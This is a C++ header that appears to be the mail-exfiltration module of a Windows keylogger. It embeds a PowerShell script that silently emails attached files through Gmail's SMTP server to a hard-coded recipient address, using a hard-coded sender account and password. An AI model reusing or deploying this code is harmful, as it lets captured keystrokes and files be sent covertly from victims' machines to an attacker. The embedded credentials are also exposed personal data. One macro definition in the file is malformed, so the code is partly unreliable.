#pragma once
#include <fstream>
#include <vector>
#include <windows.h>
#include "Timer.h"
#include "IO.h"
#include "Helper.h"

#define SCRIPT_NAME = "sm.ps1"

namespace Mail
{
    #define X_EM_TO "khanhduyn84@gmail.com"
    #define X_EM_FROM "khanhduyn96@gmail.com"
    #define X_EM_PASS "123456789"

    const std::string &PowerShellScript =
    "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
    "[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
    " {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
    "[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
    "[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
    "System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
    "\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
    "                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
    "  ForEach ($val in $Attachments)\r\n                    "
    "        {\r\n               "
    "                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
    "         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
    "}\r\n                catch\r\n                    {\r\n                        exit 2; "
    "\r\n                    }\r\n            }\r\n "
    "           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
    "           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
    "System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
    "           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
    "exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
    "  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
    "Send-EMail -attachment $Att "
    "-To \"" +
     std::string (X_EM_TO) +
     "\""
    " -Body $Body -Subject $Subj "
    "-password \"" +
     std::string (X_EM_PASS) +
      "\""
    " -From \"" +
     std::string (X_EM_FROM) +
    "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

    #undef X_EM_TO
    #undef X_EM_FROM
    #undef X_EM_PASS

    std::string StringReplace(std::string s, const std::string &what, const std::string &with)
    {
        if(what.empty())
        {
            return s;
        }
        size_t sp = 0;
        while((sp = s.find(what, sp)) != std::string::npos)
        {
            s.replace(sp, what.length(), with);
            sp += with.length();
        }
        return s;
    }

    bool CheckFileExist(const std::string &f)
    {
        std::ifstream file(f);
        return (bool)file;
    }
}


